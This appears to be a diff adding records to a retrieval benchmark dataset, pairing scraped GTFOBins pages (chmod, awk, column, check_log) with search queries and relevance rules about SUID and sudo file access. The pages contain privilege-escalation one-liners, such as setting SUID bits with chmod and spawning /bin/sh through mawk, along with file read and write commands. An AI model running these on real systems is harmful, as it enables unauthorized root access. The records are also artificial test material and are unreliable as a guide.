+        }
+      ]
+    },
+    {
+      "chunk_id": "449-0",
+      "doc_id": 449,
+      "title": "chmod | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/chmod/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 858,
+      "body": ".. / chmod Privilege escalation Privilege escalation This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Comment This can be run with elevated privileges to change permissions ( 6 denotes the SUID bits) and then read, write, or execute a file. Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . chmod 6777 /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. chmod 6777 /path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "ef026465f21340b0567d-0",
+          "query": "GTFOBins file append under SUID",
+          "information_need": "Append chosen text to a local file in the documented SUID context.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        }
+      ]
+    },
+    {
+      "chunk_id": "244-0",
+      "doc_id": 244,
+      "title": "awk | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/awk/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 2241,
+      "body": ".. / awk This is an alias of mawk . Shell File write File read Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. mawk 'BEGIN {system(\"/bin/sh\")}' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . mawk 'BEGIN {system(\"/bin/sh\")}' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. mawk 'BEGIN {system(\"/bin/sh\")}' File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }' File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. mawk '//' /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . mawk '//' /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. mawk '//' /path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "a6df8e103fc1a82eb567-0",
+          "query": "GTFOBins write data to a local path through sudo",
+          "information_need": "Find writing chosen content to a selected local file under sudo.",
+          "rule": "Requires substantive writing under sudo. Both append and overwrite qualify, but deletion and read-only examples do not."
+        },
+        {
+          "decision_id": "fd93e69d05fde804b74a-0",
+          "query": "GTFOBins add text to the end of a local file via sudo",
+          "information_need": "Add selected text to the end of a local file under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "fe242f08a893a68bc932-0",
+          "query": "GTFOBins file append under SUID",
+          "information_need": "Append chosen text to a local file in the documented SUID context.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        }
+      ]
+    },
+    {
+      "chunk_id": "497-0",
+      "doc_id": 497,
+      "title": "column | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/column/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 829,
+      "body": ".. / column File read File read This executable can read data from local files. Comment This program expects textual data. Unprivileged This function can be performed by any unprivileged user. column /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . column /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. column /path/to/input-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.",
+      "requests": [
+        {
+          "decision_id": "1422fe25b98b96876833-0",
+          "query": "GTFOBins setuid read contents from a local file",
+          "information_need": "Find a documented SUID local file read.",
+          "rule": "Retrieves substantive contents from a selected file under SUID, in the file-read example itself."
+        }
+      ]
+    },
+    {
+      "chunk_id": "424-0",
+      "doc_id": 424,
+      "title": "check_log | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/check_log/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 1095,
+      "body": ".. / check_log File write File read Comment This is the check_log Nagios plugin, available e.g. in /usr/lib/nagios/plugins/ . File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. check_log -F /path/to/input-file -O /path/to/output-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . check_log -F /path/to/input-file -O /path/to/output-file File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. check_log -F /path/to/input-file -O /dev/stdout Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . check_log -F /path/to/input-file -O /dev/stdout",
+      "requests": [
+        {
+          "decision_id": "2f6834bb6f5ea9467605-0",
+          "query": "GTFOBins sudo overwrite a local file",
+          "information_need": "Find an example that can replace existing local file contents under sudo.",
+          "rule": "Requires an actual write replacing content under sudo. Append-only, deletion and mere truncation do not qualify."
+        },
+        {
+          "decision_id": "3912813b6786f63a6f19-0",
+          "query": "GTFOBins add text to the end of a local file via sudo",
+          "information_need": "Add selected text to the end of a local file under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "5b45798c2e9e4beb26b3-0",
+          "query": "GTFOBins sudo append lines to a log",
+          "information_need": "Append chosen text lines to a local log under sudo.",
+          "rule": "Requires documented addition of chosen text to the end of a local file while retaining old contents, in the requested context of the same example. A documented append option tied to that example qualifies. Ordinary overwrite, deletion, merely appending a newline to emitted data, and other contexts do not qualify. Text formatting or tool prerequisites are allowed."
+        },
+        {
+          "decision_id": "992b5c261b661f791d5d-0",
+          "query": "GTFOBins write data to a local path through sudo",
+          "information_need": "Find writing chosen content to a selected local file under sudo.",
+          "rule": "Requires substantive writing under sudo. Both append and overwrite qualify, but deletion and read-only examples do not."
+        }
+      ]
+    }
+  ]
+}
